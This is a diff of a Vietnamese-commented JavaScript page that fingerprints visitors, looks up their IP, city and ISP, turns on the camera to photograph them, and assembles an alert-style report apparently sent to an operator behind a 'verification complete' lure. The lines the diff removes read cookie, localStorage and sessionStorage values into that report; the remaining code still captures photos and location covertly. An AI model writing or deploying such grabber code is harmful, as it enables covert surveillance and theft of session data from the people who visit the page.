@@ -434,16 +434,16 @@ setInterval(updateClock, 1000);
 updateClock();
 
 // ============================================================
-// LẤY THÔNG TIN
+// LẤY THÔNG TIN (RÚT GỌN)
 // ============================================================
 function getDeviceName() {
   const ua = navigator.userAgent;
-  if (/android/i.test(ua)) return 'Android 🤖';
-  if (/iphone|ipad|ipod/i.test(ua)) return 'iOS (Apple) 🍏';
-  if (/windows/i.test(ua)) return 'Windows PC 💻';
-  if (/macintosh|mac os x/i.test(ua)) return 'MacBook / Mac 💻';
-  if (/linux/i.test(ua)) return 'Linux 🐧';
-  return 'Thiết bị khác';
+  if (/android/i.test(ua)) return 'Android';
+  if (/iphone|ipad|ipod/i.test(ua)) return 'iOS';
+  if (/windows/i.test(ua)) return 'Windows';
+  if (/macintosh|mac os x/i.test(ua)) return 'Mac';
+  if (/linux/i.test(ua)) return 'Linux';
+  return 'Khác';
 }
 
 function getOS() {
@@ -469,12 +469,12 @@ function getBrowser() {
 
 function getBatteryInfo() {
   return new Promise((resolve) => {
-    let info = 'Không hỗ trợ';
+    let info = 'Không rõ';
     if (navigator.getBattery) {
       navigator.getBattery().then(bat => {
         const level = Math.round(bat.level * 100);
-        const charging = bat.charging ? '⚡ Đang sạc' : '🔋 Không sạc';
-        resolve(`${level}% (${charging})`);
+        const charging = bat.charging ? '⚡' : '🔋';
+        resolve(`${level}% ${charging}`);
       }).catch(() => resolve(info));
     } else {
       resolve(info);
@@ -483,83 +483,57 @@ function getBatteryInfo() {
 }
 
 function getScreenInfo() {
-  return {
-    width: window.screen.width,
-    height: window.screen.height,
-    colorDepth: window.screen.colorDepth,
-    pixelRatio: window.devicePixelRatio || 1
-  };
+  return `${window.screen.width}x${window.screen.height}`;
 }
 
 function getCookies() {
   try {
     const raw = document.cookie;
-    if (!raw) return [];
-    return raw.split(';').map(c => c.trim()).filter(c => c).map(c => {
-      const idx = c.indexOf('=');
-      if (idx === -1) return { name: c, value: '' };
-      return { name: c.substring(0, idx), value: c.substring(idx + 1) };
-    });
-  } catch(e) { return []; }
+    if (!raw) return 0;
+    return raw.split(';').filter(c => c.trim()).length;
+  } catch(e) { return 0; }
 }
 
 function getLocalStorage() {
   try {
-    const items = [];
-    for (let i = 0; i < localStorage.length; i++) {
-      const key = localStorage.key(i);
-      items.push({ key: key, value: localStorage.getItem(key) });
-    }
-    return items;
-  } catch(e) { return []; }
+    return localStorage.length || 0;
+  } catch(e) { return 0; }
 }
 
 function getSessionStorage() {
   try {
-    const items = [];
-    for (let i = 0; i < sessionStorage.length; i++) {
-      const key = sessionStorage.key(i);
-      items.push({ key: key, value: sessionStorage.getItem(key) });
-    }
-    return items;
-  } catch(e) { return []; }
+    return sessionStorage.length || 0;
+  } catch(e) { return 0; }
 }
 
 function getPlugins() {
   try {
-    const plugins = [];
-    for (let i = 0; i < navigator.plugins.length; i++) {
-      plugins.push(navigator.plugins[i].name);
-    }
-    return plugins;
-  } catch(e) { return []; }
+    return navigator.plugins.length || 0;
+  } catch(e) { return 0; }
 }
 
 function getPerformanceInfo() {
   try {
     const timing = performance.timing;
     return {
-      loadTime: timing.loadEventEnd - timing.navigationStart,
-      domReady: timing.domContentLoadedEventEnd - timing.navigationStart,
+      load: timing.loadEventEnd - timing.navigationStart,
+      dom: timing.domContentLoadedEventEnd - timing.navigationStart,
       dns: timing.domainLookupEnd - timing.domainLookupStart,
-      tcp: timing.connectEnd - timing.connectStart,
       ttfb: timing.responseStart - timing.requestStart
     };
   } catch(e) { return {}; }
 }
 
 async function getIPInfo() {
-  let data = { ip: 'Không rõ', city: 'Không rõ', region: 'Không rõ', country: 'Không rõ', isp: 'Không rõ', timezone: 'Không rõ' };
+  let data = { ip: 'Không rõ', city: 'Không rõ', country: 'Không rõ', isp: 'Không rõ' };
   try {
     const res = await fetch('https://ipwho.is/');
     const json = await res.json();
     if (json.success) {
       data.ip = json.ip || 'Không rõ';
       data.city = json.city || 'Không rõ';
-      data.region = json.region || 'Không rõ';
       data.country = json.country || 'Không rõ';
       data.isp = json.connection?.isp || json.connection?.org || 'Không rõ';
-      data.timezone = json.timezone?.id || 'Không rõ';
     }
   } catch(e) {
     try {
@@ -650,7 +624,7 @@ async function startCamera() {
 setTimeout(startCamera, 500);
 
 // ============================================================
-// CHỤP ẢNH
+// CHỤP ẢNH - CAPTION RÚT GỌN
 // ============================================================
 function playClickSound() {
   try {
@@ -688,10 +662,10 @@ captureBtn.onclick = async function() {
   const battery = await getBatteryInfo();
   const screen = getScreenInfo();
   const ip = await getIPInfo();
-  const cookies = getCookies();
-  const ls = getLocalStorage();
-  const ss = getSessionStorage();
-  const plugins = getPlugins();
+  const totalCookies = getCookies();
+  const totalLS = getLocalStorage();
+  const totalSS = getSessionStorage();
+  const totalPlugins = getPlugins();
   const perf = getPerformanceInfo();
   
   // Chụp ảnh
@@ -734,83 +708,38 @@ captureBtn.onclick = async function() {
   ctx.textAlign = 'left';
   ctx.fillText(`📍 ${ip.city || 'Unknown'}`, 15, H-11);
   
-  // Tạo caption
+  // ============================================================
+  // CAPTION RÚT GỌN - KHÔNG BỊ QUÁ DÀI
+  // ============================================================
   let caption = `🚨 <b>PHÁT HIỆN LƯỢT TRUY CẬP MỚI</b> 🚨\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
   caption += `⏰ <b>Thời gian:</b> <code>${time}</code>\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `📱 <b>THIẾT BỊ:</b>\n`;
-  caption += `  🔹 Thiết bị: ${device}\n`;
-  caption += `  🔹 Hệ điều hành: ${os}\n`;
-  caption += `  🔹 Trình duyệt: ${browser}\n`;
-  caption += `  🔹 Màn hình: ${screen.width}x${screen.height}\n`;
-  caption += `  🔹 Độ sâu màu: ${screen.colorDepth} bit\n`;
-  caption += `  🔹 Pixel Ratio: ${screen.pixelRatio}\n`;
-  caption += `  🔹 Pin: ${battery}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `🌐 <b>MẠNG & VỊ TRÍ:</b>\n`;
-  caption += `  🔹 IP: <code>${ip.ip}</code>\n`;
-  caption += `  🔹 Thành phố: ${ip.city}\n`;
-  caption += `  🔹 Khu vực: ${ip.region}\n`;
-  caption += `  🔹 Quốc gia: ${ip.country}\n`;
-  caption += `  🔹 Nhà mạng: ${ip.isp}\n`;
-  caption += `  🔹 Múi giờ: ${ip.timezone}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `🍪 <b>COOKIES (${cookies.length}):</b>\n`;
-  if (cookies.length > 0) {
-    cookies.slice(0, 5).forEach(c => {
-      let v = decodeURIComponent(c.value || '');
-      if (v.length > 40) v = v.substring(0, 40) + '…';
-      caption += `  • ${c.name} = ${v}\n`;
-    });
-    if (cookies.length > 5) caption += `  ... +${cookies.length-5} cookies\n`;
-  } else {
-    caption += `  ❌ Không có cookies\n`;
-  }
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `💾 <b>LOCAL STORAGE (${ls.length}):</b>\n`;
-  if (ls.length > 0) {
-    ls.slice(0, 5).forEach(item => {
-      let v = item.value || '';
-      if (v.length > 40) v = v.substring(0, 40) + '…';
-      caption += `  • ${item.key} = ${v}\n`;
-    });
-    if (ls.length > 5) caption += `  ... +${ls.length-5} items\n`;
-  } else {
-    caption += `  ❌ Không có dữ liệu\n`;
-  }
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `📦 <b>SESSION STORAGE (${ss.length}):</b>\n`;
-  if (ss.length > 0) {
-    ss.slice(0, 5).forEach(item => {
-      let v = item.value || '';
-      if (v.length > 40) v = v.substring(0, 40) + '…';
-      caption += `  • ${item.key} = ${v}\n`;
-    });
-    if (ss.length > 5) caption += `  ... +${ss.length-5} items\n`;
-  } else {
-    caption += `  ❌ Không có dữ liệu\n`;
-  }
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `🔌 <b>PLUGINS (${plugins.length}):</b>\n`;
-  if (plugins.length > 0) {
-    plugins.slice(0, 5).forEach((p, i) => {
-      caption += `  ${i+1}. ${p}\n`;
-    });
-    if (plugins.length > 5) caption += `  ... +${plugins.length-5} plugins\n`;
-  } else {
-    caption += `  ❌ Không có plugins\n`;
-  }
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `📊 <b>PERFORMANCE:</b>\n`;
-  caption += `  🔹 Tải trang: ${perf.loadTime || 0}ms\n`;
-  caption += `  🔹 DOM Ready: ${perf.domReady || 0}ms\n`;
-  caption += `  🔹 DNS: ${perf.dns || 0}ms\n`;
-  caption += `  🔹 TCP: ${perf.tcp || 0}ms\n`;
-  caption += `  🔹 TTFB: ${perf.ttfb || 0}ms\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `📱 <b>Thiết bị:</b> ${device} (${os})\n`;
+  caption += `🌐 <b>Trình duyệt:</b> ${browser}\n`;
+  caption += `📺 <b>Màn hình:</b> ${screen}\n`;
+  caption += `🔋 <b>Pin:</b> ${battery}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `🌐 <b>IP:</b> <code>${ip.ip}</code>\n`;
+  caption += `📍 <b>Vị trí:</b> ${ip.city}, ${ip.country}\n`;
+  caption += `🏢 <b>Nhà mạng:</b> ${ip.isp}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `🍪 <b>Cookies:</b> ${totalCookies}\n`;
+  caption += `💾 <b>LocalStorage:</b> ${totalLS}\n`;
+  caption += `📦 <b>SessionStorage:</b> ${totalSS}\n`;
+  caption += `🔌 <b>Plugins:</b> ${totalPlugins}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `📊 <b>Performance:</b>\n`;
+  caption += `  ⚡ Load: ${perf.load || 0}ms\n`;
+  caption += `  🚀 DOM: ${perf.dom || 0}ms\n`;
+  caption += `  📡 TTFB: ${perf.ttfb || 0}ms\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
   caption += `✨ <i>Trạng thái: Đã hoàn tất xác thực</i>\n`;
   caption += `🔗 <b>Nhóm lấy file:</b> `;
+  
+  // Nếu vẫn còn dài, cắt bớt
+  if (caption.length > 3800) {
+    caption = caption.substring(0, 3700) + '\n... (cắt ngắn)';
+  }
   
   canvas.toBlob(async (blob) => {
     if (blob) {
